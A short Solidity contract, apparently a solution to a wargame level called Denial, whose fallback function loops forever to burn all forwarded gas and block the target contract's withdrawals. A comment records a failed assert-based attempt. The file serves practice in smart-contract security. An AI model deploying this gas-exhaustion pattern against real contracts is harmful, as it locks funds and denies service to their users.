// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    //Code me!
    fallback() external payable {
        // assert instruction consumes all gas
        // assert(false); did not work

        // caught in while loop
        while (true) {}
    }
}
